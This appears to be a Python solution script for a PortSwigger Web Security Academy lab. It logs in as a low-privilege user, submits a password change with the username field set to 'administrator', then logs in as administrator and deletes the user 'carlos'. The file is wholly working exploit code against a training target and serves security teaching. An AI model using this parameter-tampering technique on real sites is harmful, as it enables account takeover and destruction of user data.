from web_security_academy.core.logger import logger
import re


def solve_lab(session):
    session.login("wiener", "peter")
    csrf = session.get_csrf_token("/my-account", 2)

    new_password = "123456"
    data = {
        "csrf": csrf,
        "username": "administrator",
        "new-password-1": new_password,
        "new-password-2": new_password,
    }
    logger.info(f"Changing password with the following data:")
    logger.info(data)

    resp = session.post_path("/my-account/change-password", data=data)
    if re.search("Password changed successfully!", resp.text):
        logger.success("Successfully changed administrator password.")
    else:
        logger.failure("Unable to change administrator password.")

    session.login("administrator", new_password)
    logger.info('Deleting user "carlos"...')
    session.get_path("/admin/delete?username=carlos")
